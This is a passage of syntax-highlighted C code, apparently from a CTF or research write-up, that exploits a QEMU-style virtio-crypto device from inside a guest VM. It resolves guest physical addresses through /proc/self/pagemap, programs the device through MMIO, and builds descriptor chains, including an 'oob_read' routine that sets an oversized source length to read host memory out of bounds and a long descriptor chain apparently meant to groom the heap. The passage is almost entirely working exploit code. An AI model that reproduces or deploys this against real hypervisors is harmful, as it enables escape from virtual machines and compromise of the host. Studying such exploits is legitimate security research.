class="hljs-title">virtio_crypto_hash_create_session_req</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_hash_session_para</span> <span class="hljs-title">para</span>;</span><br>	<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">40</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_mac_session_para</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_NO_MAC                       0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_HMAC_MD5                 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_HMAC_SHA1                2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_HMAC_SHA_224             3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_HMAC_SHA_256             4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_HMAC_SHA_384             5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_HMAC_SHA_512             6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_CMAC_3DES                25</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_CMAC_AES                 26</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_KASUMI_F9                27</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_SNOW3G_UIA2              28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_GMAC_AES                 41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_GMAC_TWOFISH             42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_CBCMAC_AES               49</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_CBCMAC_KASUMI_F9         50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_XCBC_AES                 53</span><br>	<span class="hljs-type">uint32_t</span> algo;<br>	<span class="hljs-comment">/* hash result length */</span><br>	<span class="hljs-type">uint32_t</span> hash_result_len;<br>	<span class="hljs-comment">/* length of authenticated key */</span><br>	<span class="hljs-type">uint32_t</span> auth_key_len;<br>	<span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_mac_create_session_req</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_mac_session_para</span> <span class="hljs-title">para</span>;</span><br>	<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">40</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_aead_session_para</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_NO_AEAD     0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AEAD_GCM    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AEAD_CCM    2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AEAD_CHACHA20_POLY1305  3</span><br>	<span class="hljs-type">uint32_t</span> algo;<br>	<span class="hljs-comment">/* length of key */</span><br>	<span class="hljs-type">uint32_t</span> key_len;<br>	<span class="hljs-comment">/* hash result length */</span><br>	<span class="hljs-type">uint32_t</span> hash_result_len;<br>	<span class="hljs-comment">/* length of the additional authenticated data (AAD) in bytes */</span><br>	<span class="hljs-type">uint32_t</span> aad_len;<br>	<span class="hljs-comment">/* encrypt or decrypt, See above VIRTIO_CRYPTO_OP_* */</span><br>	<span class="hljs-type">uint32_t</span> op;<br>	<span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_aead_create_session_req</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_aead_session_para</span> <span class="hljs-title">para</span>;</span><br>	<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">32</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_rsa_session_para</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_RSA_RAW_PADDING   0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_RSA_PKCS1_PADDING 1</span><br>	<span class="hljs-type">uint32_t</span> padding_algo;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_RSA_NO_HASH   0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_RSA_MD2       1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_RSA_MD3       2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_RSA_MD4       3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_RSA_MD5       4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_RSA_SHA1      5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_RSA_SHA256    6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_RSA_SHA384    7</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_RSA_SHA512    8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_RSA_SHA224    9</span><br>	<span class="hljs-type">uint32_t</span> hash_algo;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_ecdsa_session_para</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CURVE_UNKNOWN   0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CURVE_NIST_P192 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CURVE_NIST_P224 2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CURVE_NIST_P256 3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CURVE_NIST_P384 4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CURVE_NIST_P521 5</span><br>	<span class="hljs-type">uint32_t</span> curve_id;<br>	<span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_akcipher_session_para</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_NO_AKCIPHER    0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AKCIPHER_RSA   1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AKCIPHER_DSA   2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AKCIPHER_ECDSA 3</span><br>	<span class="hljs-type">uint32_t</span> algo;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AKCIPHER_KEY_TYPE_PUBLIC  1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AKCIPHER_KEY_TYPE_PRIVATE 2</span><br>	<span class="hljs-type">uint32_t</span> keytype;<br>	<span class="hljs-type">uint32_t</span> keylen;<br><br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_rsa_session_para</span> <span class="hljs-title">rsa</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_ecdsa_session_para</span> <span class="hljs-title">ecdsa</span>;</span><br>	&#125; u;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_akcipher_create_session_req</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_akcipher_session_para</span> <span class="hljs-title">para</span>;</span><br>	<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">36</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_alg_chain_session_para</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SYM_ALG_CHAIN_ORDER_HASH_THEN_CIPHER  1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SYM_ALG_CHAIN_ORDER_CIPHER_THEN_HASH  2</span><br>	<span class="hljs-type">uint32_t</span> alg_chain_order;<br><span class="hljs-comment">/* Plain hash */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SYM_HASH_MODE_PLAIN    1</span><br><span class="hljs-comment">/* Authenticated hash (mac) */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SYM_HASH_MODE_AUTH     2</span><br><span class="hljs-comment">/* Nested hash */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SYM_HASH_MODE_NESTED   3</span><br>	<span class="hljs-type">uint32_t</span> hash_mode;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_cipher_session_para</span> <span class="hljs-title">cipher_param</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_hash_session_para</span> <span class="hljs-title">hash_param</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_mac_session_para</span> <span class="hljs-title">mac_param</span>;</span><br>		<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">16</span>];<br>	&#125; u;<br>	<span class="hljs-comment">/* length of the additional authenticated data (AAD) in bytes */</span><br>	<span class="hljs-type">uint32_t</span> aad_len;<br>	<span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_alg_chain_session_req</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_alg_chain_session_para</span> <span class="hljs-title">para</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_sym_create_session_req</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_cipher_session_req</span> <span class="hljs-title">cipher</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_alg_chain_session_req</span> <span class="hljs-title">chain</span>;</span><br>		<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">48</span>];<br>	&#125; u;<br><br>	<span class="hljs-comment">/* Device-readable part */</span><br><br><span class="hljs-comment">/* No operation */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SYM_OP_NONE  0</span><br><span class="hljs-comment">/* Cipher only operation on the data */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SYM_OP_CIPHER  1</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Chain any cipher with any hash or mac operation. The order</span><br><span class="hljs-comment"> * depends on the value of alg_chain_order param</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SYM_OP_ALGORITHM_CHAINING  2</span><br>	<span class="hljs-type">uint32_t</span> op_type;<br>	<span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_destroy_session_req</span> &#123;</span><br>	<span class="hljs-comment">/* Device-readable part */</span><br>	<span class="hljs-type">uint64_t</span>  session_id;<br>	<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">48</span>];<br>&#125;;<br><br><span class="hljs-comment">/* The request of the control virtqueue&#x27;s packet */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_op_ctrl_req</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_ctrl_header</span> <span class="hljs-title">header</span>;</span><br><br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_sym_create_session_req</span></span><br><span class="hljs-class">			<span class="hljs-title">sym_create_session</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_hash_create_session_req</span></span><br><span class="hljs-class">			<span class="hljs-title">hash_create_session</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_mac_create_session_req</span></span><br><span class="hljs-class">			<span class="hljs-title">mac_create_session</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_aead_create_session_req</span></span><br><span class="hljs-class">			<span class="hljs-title">aead_create_session</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_akcipher_create_session_req</span></span><br><span class="hljs-class">			<span class="hljs-title">akcipher_create_session</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_destroy_session_req</span></span><br><span class="hljs-class">			<span class="hljs-title">destroy_session</span>;</span><br>		<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">56</span>];<br>	&#125; u;<br>&#125;;<br><br><br><span class="hljs-type">void</span> *mmio;<br><span class="hljs-type">void</span> *buf;<br><span class="hljs-type">void</span> *read_buf;<br>VRingDesc *desc;<br>VRingAvail *avail;<br><span class="hljs-type">int</span> vq_last_avail_idx;<br><span class="hljs-type">int</span> vq_avail_idx;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_op_data_req</span> *<span class="hljs-title">op_data</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_op_ctrl_req</span> *<span class="hljs-title">ctrl_header</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_OPCODE(service, op)   (((service) &lt;&lt; 8) | (op))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SERVICE_CIPHER 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SERVICE_HASH   1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SERVICE_MAC    2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SERVICE_AEAD   3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SERVICE_AKCIPHER 4</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_ENCRYPT \</span><br><span class="hljs-meta">	VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_CIPHER, 0x00)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_DECRYPT \</span><br><span class="hljs-meta">	VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_CIPHER, 0x01)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH \</span><br><span class="hljs-meta">	VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_HASH, 0x00)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC \</span><br><span class="hljs-meta">	VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_MAC, 0x00)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AEAD_ENCRYPT \</span><br><span class="hljs-meta">	VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_AEAD, 0x00)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AEAD_DECRYPT \</span><br><span class="hljs-meta">	VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_AEAD, 0x01)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AKCIPHER_ENCRYPT \</span><br><span class="hljs-meta">	VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_AKCIPHER, 0x00)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AKCIPHER_DECRYPT \</span><br><span class="hljs-meta">	VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_AKCIPHER, 0x01)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AKCIPHER_SIGN \</span><br><span class="hljs-meta">	VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_AKCIPHER, 0x02)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AKCIPHER_VERIFY \</span><br><span class="hljs-meta">	VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_AKCIPHER, 0x03)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_STATUS	20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_SELECT	22</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_SIZE	24</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_ENABLE	28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_DESCLO	32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_DESCHI	36</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_AVAILLO	40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_AVAILHI	44</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VRING_DESC_F_NEXT	1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VRING_DESC_F_WRITE	2</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SYM_OP_NONE  0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SYM_OP_CIPHER  1</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    close(fd);<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> val)</span>&#123;<br>    *(<span class="hljs-type">uint32_t</span>*)(mmio + addr) = val;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_virtio</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(VIRTIO_PCI_COMMON_STATUS, <span class="hljs-number">4</span>);<br>    mmio_write(VIRTIO_PCI_COMMON_Q_SELECT, <span class="hljs-number">0</span>);<br>    mmio_write(VIRTIO_PCI_COMMON_Q_SIZE, <span class="hljs-number">0x100</span>);<br>    mmio_write(VIRTIO_PCI_COMMON_Q_DESCLO, gva_to_gpa(desc));<br>    mmio_write(VIRTIO_PCI_COMMON_Q_DESCHI, <span class="hljs-number">0</span>);<br>    mmio_write(VIRTIO_PCI_COMMON_Q_AVAILLO, gva_to_gpa(avail));<br>    mmio_write(VIRTIO_PCI_COMMON_Q_AVAILHI, <span class="hljs-number">0</span>);<br>    mmio_write(VIRTIO_PCI_COMMON_Q_ENABLE, <span class="hljs-number">1</span>);<br><br>	mmio_write(VIRTIO_PCI_COMMON_Q_SELECT, <span class="hljs-number">1</span>);<br>    mmio_write(VIRTIO_PCI_COMMON_Q_SIZE, <span class="hljs-number">0x100</span>);<br>    mmio_write(VIRTIO_PCI_COMMON_Q_DESCLO, gva_to_gpa(desc));<br>    mmio_write(VIRTIO_PCI_COMMON_Q_DESCHI, <span class="hljs-number">0</span>);<br>    mmio_write(VIRTIO_PCI_COMMON_Q_AVAILLO, gva_to_gpa(avail));<br>    mmio_write(VIRTIO_PCI_COMMON_Q_AVAILHI, <span class="hljs-number">0</span>);<br>    mmio_write(VIRTIO_PCI_COMMON_Q_ENABLE, <span class="hljs-number">1</span>);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_heap</span><span class="hljs-params">()</span>&#123;<br>	avail-&gt;idx = ++vq_avail_idx;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">0</span>;<br><br>	op_data-&gt;header.opcode = VIRTIO_CRYPTO_CIPHER_ENCRYPT;<br>	op_data-&gt;u.sym_req.op_type = VIRTIO_CRYPTO_SYM_OP_CIPHER;<br>	op_data-&gt;u.sym_req.u.cipher.para.src_data_len = <span class="hljs-number">0</span>;<br><br>    desc[<span class="hljs-number">0</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(op_data);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-number">0x800</span>; <span class="hljs-comment">//sizeof(struct virtio_crypto_op_data_req);</span><br>    desc[<span class="hljs-number">0</span>].next = <span class="hljs-number">1</span>;<br>	<span class="hljs-comment">//0xc0 + i * 0x18</span><br>	<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;<br>	<span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">0x6f</span>; i++)&#123;<br>		desc[i].flags = VRING_DESC_F_NEXT;<br>		desc[i].addr = gva_to_gpa(op_data);<br>		desc[i].len = <span class="hljs-number">0x800</span>;<br>		desc[i].next = i + <span class="hljs-number">1</span>;<br>	&#125;<br>	desc[i].flags = VRING_DESC_F_WRITE;<br>    desc[i].addr = gva_to_gpa(read_buf);<br>    desc[i].len = <span class="hljs-number">0x800</span>;<br>    desc[i].next = <span class="hljs-number">0</span>;<br><br>	mmio_write(<span class="hljs-number">0x3000</span>, <span class="hljs-number">0</span>);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">oob_read</span><span class="hljs-params">()</span>&#123;<br>	avail-&gt;idx = ++vq_avail_idx;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">0</span>;<br><br>	op_data-&gt;header.opcode = VIRTIO_CRYPTO_CIPHER_ENCRYPT;<br>	op_data-&gt;u.sym_req.op_type = VIRTIO_CRYPTO_SYM_OP_CIPHER;<br>	op_data-&gt;u.sym_req.u.cipher.para.src_data_len = <span class="hljs-number">0xa88</span>;<br><br>    desc[<span class="hljs-number">0</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(op_data);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-number">0xc00</span>;<br>    desc[<span class="hljs-number">0</span>].next = <span class="hljs-number">1</span>;<br>	<br>    desc[<span class="hljs-number">1</span>].flags = VRING_DESC_F_WRITE;  <br>    desc[<span class="hljs-number">1</span>].addr = gva_to_gpa(read_buf);<br>    desc[<span class="hljs-number">1</span>].len = <span class="hljs-number">0xc00</span>;<br>    desc[<span class="hljs-number">1</span>].next = <span class="hljs-number">0</span>;<br><br>	mmio_write(<span class="hljs-number">0x3000</span>, <span class="hljs-number">0</span>);<br><br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_session</span><span class="hljs-params">()</span>&#123;<br>	avail-&gt;idx = <span class="hljs-number">2</span>;<br>    avail-&gt;ring[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>	avail-&gt;ring[<span class="hljs-number">1</span>] = <span class="hljs-number">2</span>;<br><br>	ctrl_header = buf + <span class="hljs-number">0x200</span>;<br>	ctrl_header-&gt;header.opcode  = VIRTIO_CRYPTO_CIPHER_CREATE_SESSION;<br>	ctrl_header-&gt;u.sym_create_session.op_type = VIRTIO_CRYPTO_SYM_OP_CIPHER;<br>	ctrl_header-&gt;u.sym_create_session.u.cipher.para.algo = VIRTIO_CRYPTO_CIPHER_AES_ECB;<br>	ctrl_header-&gt;u.sym_create_session.u.cipher.para.op = VIRTIO_CRYPTO_OP_ENCRYPT;<br>	ctrl_header-&gt;u.sym_create_session.u.cipher.para.keylen = <span class="hljs-number">0x10</span>;<br><br>	desc[<span class="hljs-number">0</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(ctrl_header);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-number">0x100</span>;<br>    desc[<span class="hljs-number">0</span>].next = <span class="hljs-number">1</span>;<br><br>	desc[<span class="hljs-number">1</span>].flags = VRING_DESC_F_WRITE;<br>    desc[<span class="hljs-number">1</span>].addr = gva_to_gpa(read_buf);<br>    desc[<span class="hljs-number">1</span>].len = <span class="hljs-number">0x20</span>;<br>    desc[<span class="hljs-number">1</span>].next = <span class="hljs-number">0</span>;<br><br>	ctrl_header = buf + <span class="hljs-number">0x300</span>;<br>	ctrl_header-&gt;header.opcode  = VIRTIO_CRYPTO_CIPHER_CREATE_SESSION;<br>	ctrl_header-&gt;u.sym_create_session.op_type = VIRTIO_CRYPTO_SYM_OP_CIPHER;<br>	ctrl_header-&gt;u.sym_create_session.u.cipher.para.algo = VIRTIO_CRYPTO_CIPHER_AES_ECB;<br>	ctrl_header-&gt;u.sym_create_session.u.cipher.para.op = VIRTIO_CRYPTO_OP_DECRYPT;<br>	ctrl_header-&gt;u.sym_create_session.u.cipher.para.keylen = <span class="hljs-number">0x10</span>;<br><br>	desc[<span class="hljs-number">2</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">2</span>].addr = gva_to_gpa(ctrl_header);<br>    desc[<span class="hljs-number">2</span>].len = <span class="hljs-number">0x100</span>;<br>    desc[<span 